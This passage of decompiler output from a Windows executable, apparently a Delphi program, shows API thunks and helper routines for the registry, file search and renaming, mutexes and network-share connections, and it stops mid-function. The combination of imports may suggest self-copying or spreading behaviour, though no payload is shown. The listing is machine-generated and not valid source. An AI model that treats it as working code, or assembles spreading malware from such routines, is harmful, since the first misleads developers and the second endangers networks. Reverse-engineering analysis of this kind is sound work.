LSTATUS __stdcall RegCloseKey(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403aa4. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCloseKey(hKey);
  return LVar1;
}



LSTATUS __stdcall
RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,
               REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,
               LPDWORD lpdwDisposition)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403aac. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCreateKeyExA(hKey,lpSubKey,Reserved,lpClass,dwOptions,samDesired,lpSecurityAttributes,
                          phkResult,lpdwDisposition);
  return LVar1;
}



LSTATUS __stdcall
RegEnumKeyExA(HKEY hKey,DWORD dwIndex,LPSTR lpName,LPDWORD lpcchName,LPDWORD lpReserved,
             LPSTR lpClass,LPDWORD lpcchClass,PFILETIME lpftLastWriteTime)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403ab4. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegEnumKeyExA(hKey,dwIndex,lpName,lpcchName,lpReserved,lpClass,lpcchClass,
                        lpftLastWriteTime);
  return LVar1;
}



LSTATUS __stdcall
RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403abc. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegOpenKeyExA(hKey,lpSubKey,ulOptions,samDesired,phkResult);
  return LVar1;
}



LSTATUS __stdcall
RegQueryInfoKeyA(HKEY hKey,LPSTR lpClass,LPDWORD lpcchClass,LPDWORD lpReserved,LPDWORD lpcSubKeys,
                LPDWORD lpcbMaxSubKeyLen,LPDWORD lpcbMaxClassLen,LPDWORD lpcValues,
                LPDWORD lpcbMaxValueNameLen,LPDWORD lpcbMaxValueLen,LPDWORD lpcbSecurityDescriptor,
                PFILETIME lpftLastWriteTime)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403ac4. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegQueryInfoKeyA(hKey,lpClass,lpcchClass,lpReserved,lpcSubKeys,lpcbMaxSubKeyLen,
                           lpcbMaxClassLen,lpcValues,lpcbMaxValueNameLen,lpcbMaxValueLen,
                           lpcbSecurityDescriptor,lpftLastWriteTime);
  return LVar1;
}



LSTATUS __stdcall
RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE lpData,
                LPDWORD lpcbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403acc. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegQueryValueExA(hKey,lpValueName,lpReserved,lpType,lpData,lpcbData);
  return LVar1;
}



LSTATUS __stdcall
RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,BYTE *lpData,DWORD cbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403ad4. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegSetValueExA(hKey,lpValueName,Reserved,dwType,lpData,cbData);
  return LVar1;
}



BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,BOOL bFailIfExists)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403adc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CopyFileA(lpExistingFileName,lpNewFileName,bFailIfExists);
  return BVar1;
}



HANDLE __stdcall
CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCSTR lpName)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403aec. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateMutexA(lpMutexAttributes,bInitialOwner,lpName);
  return pvVar1;
}



void FUN_00403af4(undefined param_1,undefined param_2,undefined param_3,
                 LPSECURITY_ATTRIBUTES param_4,int param_5,LPCSTR param_6)

{
  CreateMutexA(param_4,(uint)(param_5 != 0),param_6);
  return;
}



BOOL __stdcall
CreateProcessA(LPCSTR lpApplicationName,LPSTR lpCommandLine,
              LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,
              BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,
              LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,
              LPPROCESS_INFORMATION lpProcessInformation)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b14. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CreateProcessA(lpApplicationName,lpCommandLine,lpProcessAttributes,lpThreadAttributes,
                         bInheritHandles,dwCreationFlags,lpEnvironment,lpCurrentDirectory,
                         lpStartupInfo,lpProcessInformation);
  return BVar1;
}



HANDLE __stdcall
CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,
            LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,
            LPDWORD lpThreadId)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b1c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateThread(lpThreadAttributes,dwStackSize,lpStartAddress,lpParameter,dwCreationFlags,
                        lpThreadId);
  return pvVar1;
}



BOOL __stdcall DeleteFileA(LPCSTR lpFileName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b24. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = DeleteFileA(lpFileName);
  return BVar1;
}



void __stdcall ExitProcess(UINT uExitCode)

{
                    // WARNING: Could not recover jumptable at 0x00403b2c. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  ExitProcess(uExitCode);
  return;
}



void __stdcall ExitThread(DWORD dwExitCode)

{
                    // WARNING: Could not recover jumptable at 0x00403b34. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  ExitThread(dwExitCode);
  return;
}



BOOL __stdcall FileTimeToDosDateTime(FILETIME *lpFileTime,LPWORD lpFatDate,LPWORD lpFatTime)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b3c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FileTimeToDosDateTime(lpFileTime,lpFatDate,lpFatTime);
  return BVar1;
}



BOOL __stdcall FileTimeToLocalFileTime(FILETIME *lpFileTime,LPFILETIME lpLocalFileTime)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b44. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FileTimeToLocalFileTime(lpFileTime,lpLocalFileTime);
  return BVar1;
}



BOOL __stdcall FindClose(HANDLE hFindFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b4c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindClose(hFindFile);
  return BVar1;
}



HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b54. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
  return pvVar1;
}



BOOL __stdcall FindNextFileA(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b5c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindNextFileA(hFindFile,lpFindFileData);
  return BVar1;
}



BOOL __stdcall
GetDiskFreeSpaceA(LPCSTR lpRootPathName,LPDWORD lpSectorsPerCluster,LPDWORD lpBytesPerSector,
                 LPDWORD lpNumberOfFreeClusters,LPDWORD lpTotalNumberOfClusters)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b64. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetDiskFreeSpaceA(lpRootPathName,lpSectorsPerCluster,lpBytesPerSector,
                            lpNumberOfFreeClusters,lpTotalNumberOfClusters);
  return BVar1;
}



DWORD __stdcall GetLastError(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b74. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetLastError();
  return DVar1;
}



DWORD __stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b7c. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleFileNameA(hModule,lpFilename,nSize);
  return DVar1;
}



HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b84. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetModuleHandleA(lpModuleName);
  return pHVar1;
}



FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)

{
  FARPROC pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b8c. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = GetProcAddress(hModule,lpProcName);
  return pFVar1;
}



BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b94. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetVersionExA(lpVersionInformation);
  return BVar1;
}



BOOL __stdcall MoveFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403b9c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = MoveFileA(lpExistingFileName,lpNewFileName);
  return BVar1;
}



void __stdcall Sleep(DWORD dwMilliseconds)

{
                    // WARNING: Could not recover jumptable at 0x00403bac. Too many branches
                    // WARNING: Treating indirect jump as call
  Sleep(dwMilliseconds);
  return;
}



DWORD __stdcall
WNetAddConnection2A(LPNETRESOURCEA lpNetResource,LPCSTR lpPassword,LPCSTR lpUserName,DWORD dwFlags)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403bb4. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = WNetAddConnection2A(lpNetResource,lpPassword,lpUserName,dwFlags);
  return DVar1;
}



DWORD __stdcall WNetCancelConnectionA(LPCSTR lpName,BOOL fForce)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403bbc. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = WNetCancelConnectionA(lpName,fForce);
  return DVar1;
}



LRESULT __stdcall DispatchMessageA(MSG *lpMsg)

{
  LRESULT LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403bc4. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = DispatchMessageA(lpMsg);
  return LVar1;
}



BOOL __stdcall GetMessageA(LPMSG lpMsg,HWND hWnd,UINT wMsgFilterMin,UINT wMsgFilterMax)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403bcc. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetMessageA(lpMsg,hWnd,wMsgFilterMin,wMsgFilterMax);
  return BVar1;
}



int __stdcall MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00403bd4. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MessageBoxA(hWnd,lpText,lpCaption,uType);
  return iVar1;
}



void FUN_00403bdc(undefined4 *param_1,uint param_2)

{
  FUN_004019d0(param_1,param_2,0);
  return;
}



void FUN_00403be4(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack_10 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack_10;
  DAT_0040c464 = DAT_0040c464 + 1;
  *in_FS_OFFSET = uVar1;
  return;
}



int * FUN_00403ca8(int *param_1,char param_2,undefined4 param_3)

{
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00401f88((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_2 = extraout_DL;
  }
  param_1[2] = 0;
  FUN_004033e4((int **)(param_1 + 1),(int)&DAT_00403c20,1);
  if (param_2 != '\0') {
    FUN_00401fe0(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_00403cf4(int param_1,undefined4 *param_2)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  undefined4 *local_8;
  
  puStack_10 = (undefined *)0x403d06;
  local_8 = param_2;
  FUN_00402b14((int)param_2);
  puStack_14 = &LAB_00403d59;
  uStack_18 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_18;
  puStack_10 = &stack0xfffffffc;
  FUN_004033e4((int **)(param_1 + 4),(int)&DAT_00403c20,1);
  FUN_004026e0((int *)(*(int *)(param_1 + 4) + *(int *)(param_1 + 8) * 4),local_8);
  *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
  *in_FS_OFFSET = uStack_18;
  puStack_10 = &LAB_00403d60;
  puStack_14 = (undefined *)0x403d58;
  FUN_0040268c((int *)&local_8);
  return;
}



void FUN_00403d64(int param_1,int param_2,int *param_3)

{
  FUN_004026e0(param_3,*(undefined4 **)(*(int *)(param_1 + 4) + param_2 * 4));
  return;
}



void FUN_00403de8(byte *param_1,byte **param_2)

{
  byte bVar1;
  undefined4 *puVar2;
  byte *pbVar3;
  
  puVar2 = (undefined4 *)FUN_0040292c((int)param_1);
  FUN_00402cac((int *)param_2,puVar2);
  pbVar3 = *param_2;
  for (; puVar2 != (undefined4 *)0x0; puVar2 = (undefined4 *)((int)puVar2 + -1)) {
    bVar1 = *param_1;
    if ((0x60 < bVar1) && (bVar1 < 0x7b)) {
      bVar1 = bVar1 - 0x20;
    }
    *pbVar3 = bVar1;
    param_1 = param_1 + 1;
    pbVar3 = pbVar3 + 1;
  }
  return;
}



void FUN_00403e24(byte *param_1,byte **param_2)

{
  byte bVar1;
  undefined4 *puVar2;
  byte *pbVar3;
  
  puVar2 = (undefined4 *)FUN_0040292c((int)param_1);
  FUN_00402cac((int *)param_2,puVar2);
  pbVar3 = *param_2;
  for (; puVar2 != (undefined4 *)0x0; puVar2 = (undefined4 *)((int)puVar2 + -1)) {
    bVar1 = *param_1;
    if ((0x40 < bVar1) && (bVar1 < 0x5b)) {
      bVar1 = bVar1 + 0x20;
    }
    *pbVar3 = bVar1;
    param_1 = param_1 + 1;
    pbVar3 = pbVar3 + 1;
  }
  return;
}



void FUN_00403e60(uint param_1,int *param_2)

{
  byte abStack_108 [256];
  
  FUN_00401bc4(param_1,(char *)abStack_108);
  FUN_004028e4(param_2,abStack_108);
  return;
}



void FUN_00403e88(byte *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  int local_c;
  byte *local_8;
  
  puStack_14 = (undefined *)0x403e9a;
  local_8 = param_1;
  FUN_00402b14((int)param_1);
  puStack_18 = &LAB_00403ed3;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  puStack_14 = &stack0xfffffffc;
  FUN_00401bfc(local_8,&local_c);
  *in_FS_OFFSET = uStack_1c;
  puStack_14 = &LAB_00403eda;
  puStack_18 = (undefined *)0x403ed2;
  FUN_0040268c((int *)&local_8);
  return;
}



bool FUN_00403f44(byte *param_1,byte *param_2)

{
  BOOL BVar1;
  undefined4 local_208 [64];
  undefined4 local_108 [64];
  
  FUN_00401318((undefined4 *)(param_1 + 1),local_208,(undefined4 *)(uint)*param_1);
  *(undefined *)((int)local_208 + (uint)*param_1) = 0;
  FUN_00401318((undefined4 *)(param_2 + 1),local_108,(undefined4 *)(uint)*param_2);
  *(undefined *)((int)local_108 + (uint)*param_2) = 0;
  BVar1 = MoveFileA((LPCSTR)local_208,(LPCSTR)local_108);
  return (bool)('\x01' - (BVar1 == 0));
}



void FUN_0040401c(void)

{
  HMODULE hModule;
  
  hModule = GetModuleHandleA("kernel32.dll");
  if (hModule != (HMODULE)0x0) {
    DAT_004090cc = GetProcAddress(hModule,"GetDiskFreeSpaceExA");
  }
  if (DAT_004090cc == (FARPROC)0x0) {
    DAT_004090cc = (FARPROC)&LAB_00403fa8;
  }
  return;
}



DWORD FUN_00404078(LPWORD param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  _FILETIME local_c;
  
  do {
    if ((*(uint *)(param_1 + 0xc) & *(uint *)(param_1 + 8)) == 0) {
      FileTimeToLocalFileTime((FILETIME *)(param_1 + 0x16),&local_c);
      FileTimeToDosDateTime(&local_c,param_1 + 1,param_1);
      *(undefined4 *)(param_1 + 2) = *(undefined4 *)(param_1 + 0x1c);
      *(undefined4 *)(param_1 + 4) = *(undefined4 *)(param_1 + 0xc);
      FUN_004028f0((int *)(param_1 + 6),(undefined4 *)(param_1 + 0x22),0x104);
      return 0;
    }
    BVar1 = FindNextFileA(*(HANDLE *)(param_1 + 10),(LPWIN32_FIND_DATAA)(param_1 + 0xc));
  } while (BVar1 != 0);
  DVar2 = GetLastError();
  return DVar2;
}



DWORD FUN_004040dc(undefined *param_1,uint param_2,LPWORD param_3)

{
  LPCSTR lpFileName;
  HANDLE pvVar1;
  DWORD DVar2;
  LPWIN32_FIND_DATAA lpFindFileData;
  
  *(uint *)(param_3 + 8) = ~param_2 & 0x1e;
  lpFindFileData = (LPWIN32_FIND_DATAA)(param_3 + 0xc);
  lpFileName = FUN_00402b24(param_1);
  pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
  *(HANDLE *)(param_3 + 10) = pvVar1;
  if (pvVar1 == (HANDLE)0xffffffff) {
    DVar2 = GetLastError();
  }
  else {
    DVar2 = FUN_00404078(param_3);
    if (DVar2 != 0) {
      FUN_00404150((int)param_3);
    }
  }
  return DVar2;
}



void FUN_00404150(int param_1)

{
  if (*(HANDLE *)(param_1 + 0x14) != (HANDLE)0xffffffff) {
    FindClose(*(HANDLE *)(param_1 + 0x14));
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00404160(void)

{
  BOOL BVar1;
  
  _DAT_0040c548 = 0x94;
  BVar1 = GetVersionExA((LPOSVERSIONINFOA)&DAT_0040c548);
  if (BVar1 != 0) {
    DAT_004090b8 = DAT_0040c558;
    _DAT_004090bc = DAT_0040c54c;
    _DAT_004090c0 = DAT_0040c550;
    _DAT_004090c4 = DAT_0040c554;
    FUN_004028f0((int *)&DAT_004090c8,(undefined4 *)&DAT_0040c55c,0x80);
  }
  return;
}



undefined4 FUN_00404348(int param_1)

{
  undefined3 uVar1;
  
  if (param_1 == 1) {
    return 1;
  }
  if (param_1 == 2) {
    return 2;
  }
  if (param_1 == 3) {
    return 4;
  }
  uVar1 = (undefined3)((uint)(param_1 + -4) >> 8);
  if (param_1 + -4 != 0) {
    return CONCAT31(uVar1,4);
  }
  return CONCAT31(uVar1,3);
}



int * FUN_00404368(int *param_1,char param_2,undefined4 param_3)

{
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00401f88((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_2 = extraout_DL;
  }
  FUN_004043c8((int)param_1,(HKEY)0x80000001);
  param_1[5] = 0xf003f;
  if (param_2 != '\0') {
    FUN_00401fe0(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_004043a8(int param_1)

{
  if (*(HKEY *)(param_1 + 4) != (HKEY)0x0) {
    RegCloseKey(*(HKEY *)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
    FUN_0040268c((int *)(param_1 + 0xc));
  }
  return;
}



void FUN_004043c8(int param_1,HKEY param_2)

{
  if (param_2 != *(HKEY *)(param_1 + 8)) {
    if (*(char *)(param_1 + 0x10) != '\0') {
      RegCloseKey(*(HKEY *)(param_1 + 8));
      *(undefined *)(param_1 + 0x10) = 0;
    }
    *(HKEY *)(param_1 + 8) = param_2;
    FUN_004043a8(param_1);
  }
  return;
}



void FUN_004043f4(int param_1,int param_2,char param_3)

{
  bool bVar1;
  LPCSTR pCVar2;
  int iVar3;
  HKEY hKey;
  LPSECURITY_ATTRIBUTES *in_FS_OFFSET;
  DWORD Reserved;
  LPSTR lpClass;
  DWORD dwOptions;
  REGSAM RVar4;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  HKEY *ppHVar5;
  DWORD *lpdwDisposition;
  _SECURITY_ATTRIBUTES _Stack_2c;
  DWORD local_14;
  LPSECURITY_ATTRIBUTES local_10;
  HKEY local_c;
  undefined local_6;
  char local_5;
  
  _Stack_2c.bInheritHandle = (BOOL)&stack0xfffffffc;
  local_10 = (LPSECURITY_ATTRIBUTES)0x0;
  _Stack_2c.lpSecurityDescriptor = &LAB_0040450f;
  _Stack_2c.nLength = (DWORD)*in_FS_OFFSET;
  *in_FS_OFFSET = &_Stack_2c;
  local_5 = param_3;
  FUN_00402724((int *)&local_10,param_2);
  if ((local_10 == (LPSECURITY_ATTRIBUTES)0x0) || (*(char *)&local_10->nLength != '\\')) {
    bVar1 = true;
  }
  else {
    bVar1 = false;
  }
  if (!bVar1) {
    FUN_00402bc0((int *)&local_10,1,1);
  }
  hKey = *(HKEY *)(param_1 + 4);
  if ((hKey == (HKEY)0x0) || (!bVar1)) {
    hKey = *(HKEY *)(param_1 + 8);
  }
  local_c = (HKEY)0x0;
  if ((local_5 == '\0') || (local_10 == (LPSECURITY_ATTRIBUTES)0x0)) {
    ppHVar5 = &local_c;
    RVar4 = *(REGSAM *)(param_1 + 0x14);
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    pCVar2 = FUN_00402b24((undefined *)local_10);
    iVar3 = RegOpenKeyExA(hKey,pCVar2,(DWORD)lpSecurityAttributes,RVar4,ppHVar5);
  }
  else {
    lpdwDisposition = &local_14;
    ppHVar5 = &local_c;
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    RVar4 = *(REGSAM *)(param_1 + 0x14);
    dwOptions = 0;
    lpClass = (LPSTR)0x0;
    Reserved = 0;
    pCVar2 = FUN_00402b24((undefined *)local_10);
    iVar3 = RegCreateKeyExA(hKey,pCVar2,Reserved,lpClass,dwOptions,RVar4,lpSecurityAttributes,
                            ppHVar5,lpdwDisposition);
  }
  local_6 = iVar3 == 0;
  if ((bool)local_6) {
    if ((bool)(*(int *)(param_1 + 4) != 0 & bVar1)) {
      lpSecurityAttributes = local_10;
      FUN_004029ec((int *)&local_10,3);
    }
    FUN_004043a8(param_1);
    *(HKEY *)(param_1 + 4) = local_c;
    FUN_004026e0((int *)(param_1 + 0xc),&local_10->nLength);
  }
  *in_FS_OFFSET = lpSecurityAttributes;
  FUN_0040268c((int *)&local_10);
  return;
}



void FUN_0040452c(int param_1,int param_2)

{
  LSTATUS LVar1;
  LPSTR lpName;
  undefined4 *puVar2;
  DWORD DVar3;
  DWORD dwIndex;
  undefined4 *in_FS_OFFSET;
  DWORD *lpcchName;
  LPDWORD lpReserved;
  LPSTR lpClass;
  LPDWORD lpcchClass;
  PFILETIME lpftLastWriteTime;
  undefined4 uStack_48;
  undefined *puStack_44;
  undefined *puStack_40;
  undefined4 *local_30;
  DWORD local_2c;
  DWORD local_28;
  DWORD local_24;
  DWORD local_20;
  DWORD local_1c;
  _FILETIME local_18;
  undefined *local_10;
  DWORD local_c;
  int local_8;
  
  puStack_40 = &stack0xfffffffc;
  local_30 = (undefined4 *)0x0;
  local_10 = (undefined *)0x0;
  puStack_44 = &LAB_00404634;
  uStack_48 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_48;
  local_8 = param_2;
  FUN_004019d0(&local_2c,0x1c,0);
  LVar1 = RegQueryInfoKeyA(*(HKEY *)(param_1 + 4),(LPSTR)0x0,(LPDWORD)0x0,(LPDWORD)0x0,&local_2c,
                           &local_28,(LPDWORD)0x0,&local_24,&local_20,&local_1c,(LPDWORD)0x0,
                           &local_18);
  if ((PTR_DAT_0040a704[8] != '\0') && (*(int *)PTR_DAT_0040a6fc == 2)) {
    local_28 = local_28 * 2;
    local_20 = local_20 * 2;
  }
  if (LVar1 == 0) {
    FUN_00402778((int *)&local_10,(undefined4 *)0x0,(undefined4 *)(local_28 + 1));
    if (-1 < (int)(local_2c - 1)) {
      dwIndex = 0;
      DVar3 = local_2c;
      do {
        local_c = local_28 + 1;
        lpftLastWriteTime = (PFILETIME)0x0;
        lpcchClass = (LPDWORD)0x0;
        lpClass = (LPSTR)0x0;
        lpReserved = (LPDWORD)0x0;
        lpcchName = &local_c;
        lpName = FUN_00402b24(local_10);
        RegEnumKeyExA(*(HKEY *)(param_1 + 4),dwIndex,lpName,lpcchName,lpReserved,lpClass,lpcchClass,
                      lpftLastWriteTime);
        puVar2 = (undefined4 *)FUN_00402b24(local_10);
        FUN_00402878((int *)&local_30,puVar2);
        FUN_00403cf4(local_8,local_30);
        dwIndex = dwIndex + 1;
        DVar3 = DVar3 - 1;
      } while (DVar3 != 0);
    }
  }
  *in_FS_OFFSET = uStack_48;
  puStack_40 = &LAB_0040463b;
  puStack_44 = (undefined *)0x40462b;
  FUN_0040268c((int *)&local_30);
  puStack_44 = (undefined *)0x404633;
  FUN_0040268c((int *)&local_10);
  return;
}



bool FUN_00404644(int param_1,undefined *param_2,undefined4 *param_3)

{
  LPCSTR lpValueName;
  LSTATUS LVar1;
  undefined4 uVar2;
  LPDWORD lpReserved;
  undefined4 **lpType;
  LPBYTE lpData;
  LPDWORD lpcbData;
  undefined4 *local_14;
  
  lpType = &local_14;
  local_14 = param_3;
  FUN_004019d0(param_3,8,0);
  lpcbData = param_3 + 1;
  lpData = (LPBYTE)0x0;
  lpReserved = (LPDWORD)0x0;
  lpValueName = FUN_00402b24(param_2);
  LVar1 = RegQueryValueExA(*(HKEY *)(param_1 + 4),lpValueName,lpReserved,(LPDWORD)lpType,lpData,
                           lpcbData);
  uVar2 = FUN_00404348((int)local_14);
  *(char *)param_3 = (char)uVar2;
  return LVar1 == 0;
}



void FUN_00404694(int param_1,undefined *param_2,undefined *param_3)

{
  int iVar1;
  DWORD DVar2;
  BYTE *pBVar3;
  char cVar4;
  
  iVar1 = FUN_0040292c((int)param_3);
  DVar2 = iVar1 + 1;
  cVar4 = '\x01';
  pBVar3 = FUN_00402b24(param_3);
  FUN_004046c0(param_1,param_2,pBVar3,cVar4,DVar2);
  return;
}



void FUN_004046c0(int param_1,undefined *param_2,BYTE *param_3,char param_4,DWORD param_5)

{
  LPCSTR lpValueName;
  DWORD dwType;
  DWORD Reserved;
  
  if (param_4 == '\x01') {
    dwType = 1;
  }
  else if (param_4 == '\x02') {
    dwType = 2;
  }
  else if (param_4 == '\x03') {
    dwType = 4;
  }
  else if (param_4 == '\x04') {
    dwType = 3;
  }
  else {
    dwType = 0;
  }
  Reserved = 0;
  lpValueName = FUN_00402b24(param_2);
  RegSetValueExA(*(HKEY *)(param_1 + 4),lpValueName,Reserved,dwType,param_3,param_5);
  return;
}



void FUN_00404728(int param_1,undefined *param_2)

{
  undefined4 auStack_8 [2];
  
  FUN_00404644(param_1,param_2,auStack_8);
  return;
}



HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404770. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = LoadLibraryA(lpLibFileName);
  return pHVar1;
}



void FUN_00404778(void)

{
  int *in_FS_OFFSET;
  undefined *puStack_114;
  undefined *puStack_110;
  undefined *puStack_10c;
  undefined4 *local_108;
  undefined4 local_104 [64];
  
  puStack_10c = &stack0xfffffffc;
  local_108 = (undefined4 *)0x0;
  puStack_110 = &LAB_004047ed;
  puStack_114 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = (int)&puStack_114;
  (*DAT_0040c618)();
  FUN_004028f0((int *)&local_108,local_104,0x100);
  FUN_00402978((int *)&DAT_0040c6dc,local_108,(undefined4 *)&DAT_00404800);
  *in_FS_OFFSET = (int)local_104;
  puStack_114 = &LAB_004047f4;
  FUN_0040268c((int *)&local_108);
  return;
}



void FUN_00404804(undefined *param_1,int *param_2)

{
  undefined *puVar1;
  undefined *puVar2;
  int iVar3;
  undefined4 *puVar4;
  char *pcVar5;
  int iVar6;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1cc;
  undefined *puStack_1c8;
  undefined *puStack_1c4;
  undefined4 uStack_1c0;
  undefined *puStack_1bc;
  undefined4 uStack_1b8;
  undefined *puStack_1b4;
  undefined *puStack_1b0;
